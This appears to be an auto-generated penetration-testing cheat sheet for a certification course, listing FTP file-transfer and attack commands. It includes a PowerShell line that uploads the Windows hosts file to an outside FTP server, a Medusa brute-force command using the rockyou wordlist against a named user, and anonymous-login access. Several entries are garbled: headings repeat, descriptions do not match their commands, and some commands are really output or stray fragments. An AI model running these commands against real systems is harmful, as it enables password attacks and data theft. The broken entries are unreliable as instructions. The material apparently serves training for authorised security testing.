# FTP

% ftp, cpts

## FTP - FTP - FTP - FTP - ftp-downloads
#cat/RECON #cpts
```
sudo python3 -m pyftpdlib --port 21
```

## FTP - FTP - FTP - FTP - ftp-downloads-2
#cat/RECON #cpts
After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient.

```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## FTP - FTP - FTP - FTP - ftp-downloads-3
#cat/RECON #cpts
Create a Command File for the FTP Client and Download the Target File on Windows

```
echo open 192.168.49.128 > ftpcommand.txt
```

## FTP - FTP - FTP - FTP - ftp-downloads-4
#cat/RECON #cpts
Create a Command File for the FTP Client and Download the Target File on Windows

```
echo USER anonymous >> ftpcommand.txt
```

## FTP - FTP - FTP - FTP - ftp-downloads-5
#cat/RECON #cpts
Create a Command File for the FTP Client and Download the Target File on Windows

```
echo binary >> ftpcommand.txt
```

## FTP - FTP - FTP - FTP - ftp-downloads-6
#cat/RECON #cpts
Create a Command File for the FTP Client and Download the Target File on Windows

```
echo GET file.txt >> ftpcommand.txt
```

## FTP - FTP - FTP - FTP - ftp-downloads-7
#cat/RECON #cpts
Create a Command File for the FTP Client and Download the Target File on Windows

```
echo bye >> ftpcommand.txt
```

## FTP - FTP - FTP - FTP - ftp-downloads-8
#cat/RECON #cpts
Create a Command File for the FTP Client and Download the Target File on Windows

```
ftp -v -n -s:ftpcommand.txt
```

## FTP - FTP - FTP - FTP - ftp-uploads
#cat/RECON #cpts
```
sudo python3 -m pyftpdlib --port 21 --write
```

## FTP - FTP - FTP - FTP - ftp-uploads-2
#cat/RECON #cpts
```
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

## FTP - FTP - FTP - FTP - ftp-uploads-3
#cat/RECON #cpts
Create a Command File for the FTP Client to Upload a File

```
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
```

## FTP - FTP - FTP - FTP - create-a-command-file-for-the-ftp-client-and-download-the-target-file
#cat/RECON #cpts
Windows File Transfer Methods

```
ftp> open 192.168.49.128
```

## FTP - FTP - FTP - FTP - anonymous-authentication
#cat/RECON #cpts
Attacking FTP

```
ftp 192.168.2.142
```

## FTP - FTP - FTP - FTP - brute-forcing-with-medusa
#cat/RECON #cpts
Attacking FTP

```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

## FTP - FTP - FTP - FTP - brute-forcing-with-medusa-2
#cat/RECON #cpts
Attacking FTP

```
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
```

## FTP - FTP - FTP - FTP - target-system
#cat/RECON #cpts
Latest FTP Vulnerabilities

```
C:\> type C:\whoops
```

## FTP - FTP - FTP - FTP - ftp
#cat/RECON #cpts
As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:

```
sudo python -m pyftpdlib -p 21
```

## FTP - FTP - FTP - FTP - osticket---sensitive-data-exposure
#cat/RECON #cpts
This dump shows cleartext passwords for two different users: `jclayton` and `kgrimes`. At this point, we have also performed subdomain enumeration and come across several interesting ones.

```
cat ilfreight_subdomains
```

## FTP - FTP - FTP - FTP - osticket---sensitive-data-exposure-2
#cat/RECON #cpts
This dump shows cleartext passwords for two different users: `jclayton` and `kgrimes`. At this point, we have also performed subdomain enumeration and come across several interesting ones.

```
ftp.inlanefreight.local
```

## FTP - FTP - FTP - FTP - enumerate-the-accessible-services-and-find-a-flag-submit-the-flag-valu
#cat/RECON #cpts
Students need to connect to the FTP server on the spawned target machine with `ftp` using anonymous login (i.e., utilizing the credentials `anonymous:anonymous`, or any arbitrary string for the password):

```
ftp STMIP
```

## FTP - FTP - FTP - FTP - enumerate-the-accessible-services-and-find-a-flag-submit-the-flag-valu-2
#cat/RECON #cpts
```
shell-session
```

